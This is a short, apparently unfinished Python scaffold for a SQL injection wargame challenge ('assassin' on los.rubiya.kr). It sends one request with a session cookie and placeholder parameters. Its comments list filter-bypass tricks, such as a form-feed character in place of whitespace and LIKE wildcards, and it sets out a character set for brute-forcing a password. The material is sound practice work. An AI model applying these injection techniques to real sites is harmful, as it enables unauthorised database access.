#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt
import urllib.parse

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
parameter1 = 'id'
parameter2 = 'pw'
cookie = dict(PHPSESSID='e65uev8hnti7n47a7qe5auesel')

# select 1234 from{$_GET[shit]}prob_giant where 1

# page feed FF 0xc can also work to bypass the whitespace filter

# underscore matches one letter
# percent symbol is a wild card

common = ('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$&\'()*+,-./:;<=>?@[\\]^`{|}~')
passwd = ''

query1 = "1"
query2 = "1"
query_url = "%s?%s=%s&%s=%s" % (url,parameter1,query1,parameter2,query2)

print("[*]URL: %s" % query_url)

http_request=requests.get(query_url,cookies=cookie)
res = bs(http_request.text,"html.parser")

print(res.text)




